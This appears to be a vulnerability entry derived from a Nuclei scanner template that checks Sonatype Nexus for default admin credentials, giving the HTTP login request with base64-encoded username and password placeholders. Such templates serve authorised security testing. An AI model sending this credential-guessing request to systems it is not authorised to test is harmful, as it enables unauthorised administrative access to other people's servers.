# Nuclei Template: Nexus Default Login
**Template ID:** nexus-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`nexus-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Nexus default admin credentials were discovered.

## Steps to reproduce / Exploit Payload
```http
POST /service/rapture/session HTTP/1.1
Host: {{Hostname}}
X-Nexus-UI: true
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

username={{base64(username)}}&password={{base64(password)}}
```

